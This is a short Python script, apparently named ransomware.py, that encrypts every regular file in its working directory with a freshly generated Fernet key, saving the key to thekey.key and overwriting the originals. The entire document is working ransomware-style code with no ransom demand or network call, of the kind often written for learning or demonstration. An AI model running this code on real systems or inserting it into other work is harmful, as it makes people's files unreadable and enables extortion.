import os 
from cryptography.fernet import Fernet


files = []

for file in os.listdir():
    if (file == "ransomware.py" or file == "thekey.key"):
        continue
    if (os.path.isfile(file)):
        files.append(file)

# Create a key with Fernet
key = Fernet.generate_key()

# Write the key in a file
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file,"rb") as thefile:
        content = thefile.read()
    content_to_encrypt = Fernet(key).encrypt(content)
    with open(file,"wb") as thefile:
        thefile.write(content_to_encrypt)